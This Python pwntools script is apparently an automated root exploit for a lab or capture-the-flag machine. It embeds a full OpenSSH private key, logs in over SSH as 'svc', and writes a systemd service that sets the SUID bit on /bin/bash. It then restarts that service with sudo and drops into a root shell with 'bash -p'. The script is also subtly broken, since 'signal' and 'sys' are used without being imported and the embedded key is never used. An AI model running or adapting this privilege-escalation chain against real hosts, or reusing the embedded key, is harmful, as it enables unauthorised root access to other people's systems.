from pwn import *
import subprocess
import string
import argparse
import time
import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Encoder - Ninhpn1337\n")
except:
    print('\n[\033[1;31m!\033[1;37m] Root please\n\n[\033[1;31m!\033[1;37m] \n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Quit!\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ('-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----')


request = ssh(host='10.10.11.198', user='svc', keyfile='key')
shell = request.process("/bin/bash")
time.sleep(0.5)
shell.sendline(b"echo 'ExecStart=chmod u+s /bin/bash' > /etc/systemd/system/privesc.service")
time.sleep(0.5)
shell.sendline(b"echo '[Service]\nType=oneshot\nExecStart=chmod u+s /bin/bash\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/privesc.service")
time.sleep(0.5)
shell.sendline(b"cat /etc/systemd/system/privesc.service")
time.sleep(0.5)
shell.sendline(b"sudo systemctl restart privesc")
time.sleep(1)
shell.sendline(b"bash -p")
time.sleep(0.5)
shell.sendline(b"clear")
shell.sendline(b"whoami")
shell.interactive()

